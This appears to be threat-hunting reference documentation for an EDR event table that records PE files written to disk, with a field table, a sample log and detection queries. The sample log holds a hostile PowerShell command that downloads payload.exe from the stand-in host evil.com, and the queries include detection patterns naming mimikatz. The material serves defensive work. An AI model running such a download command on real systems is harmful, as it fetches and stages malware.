## PeFileWrittenDetectInfo Table: PE File Written Detection Event

### 1. Table Name
**PeFileWrittenDetectInfo**

---

### 2. Table Usage
This event is generated when a Portable Executable (PE) file, such as an .exe or .dll, is written to disk. This is a critical event for threat hunting, as it often signifies malware being dropped, an attacker staging tools, or "living-off-the-land" techniques where legitimate utilities are written to disk for malicious purposes. This event provides rich context about the file that was written and the process that wrote it.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path of the PE file that was written to disk. | Windows Only |
| WritingProcessId | The Process ID of the process that wrote the PE file. | Windows Only |
| WritingProcessImageFileName | The name of the process that wrote the PE file. | Windows Only |
| WritingProcessCommandLine | The command line of the process that wrote the PE file. | Windows Only |
| ParentOfWritingProcessImageFileName | The name of the parent process of the writing process. | Windows Only |
| ParentOfWritingProcessCommandLine | The command line of the parent of the writing process. | Windows Only |
| OriginalFilename | The original filename of the PE file, extracted from its version information resource. | Windows Only |
| CompanyName | The company name from the PE file's version information. | Windows Only |
| FileVersion | The file version from the PE file's version information. | Windows Only |
| ImageSubsystem | The subsystem required to run the PE file, such as GUI (`2`) or CUI (`3`). | Windows Only |
| ModuleCharacteristics | A bitmask of flags indicating the characteristics of the PE file, such as if it's an executable (`2`) or a DLL (`8192`). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\malicious.exe",
  "WritingProcessId": "4580",
  "WritingProcessImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "WritingProcessCommandLine": "powershell -c \"(New-Object Net.WebClient).DownloadFile('[http://evil.com/payload.exe](http://evil.com/payload.exe)', 'malicious.exe')\"",
  "ParentOfWritingProcessImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "ParentOfWritingProcessCommandLine": "cmd.exe /c powershell...",
  "OriginalFilename": "payload.exe",
  "CompanyName": "Evil Corp",
  "FileVersion": "1.0.0.1",
  "ImageSubsystem": "2",
  "ModuleCharacteristics": "2"
}
```
---

### 5. Example Queries
```xql
// Find all PE file write detection events
event_simpleName=PeFileWrittenDetectInfo

// Hunt for PE files written by scripting engines like PowerShell or WScript
event_simpleName=PeFileWrittenDetectInfo WritingProcessImageFileName IN ("*\\powershell.exe", "*\\wscript.exe", "*\\cscript.exe")

// Find PE files being written to suspicious locations like Temp or Public user directories
event_simpleName=PeFileWrittenDetectInfo ImageFileName="*\\Temp\\*" OR ImageFileName="*\\Users\\Public\\*"

// Search for PE files written by a parent process of an Office application, which can indicate macro-based attacks
event_simpleName=PeFileWrittenDetectInfo ParentOfWritingProcessImageFileName IN ("*\\winword.exe", "*\\excel.exe")

// Find PE files with a specific original filename, regardless of what they were renamed to
event_simpleName=PeFileWrittenDetectInfo OriginalFilename="mimikatz.exe"
```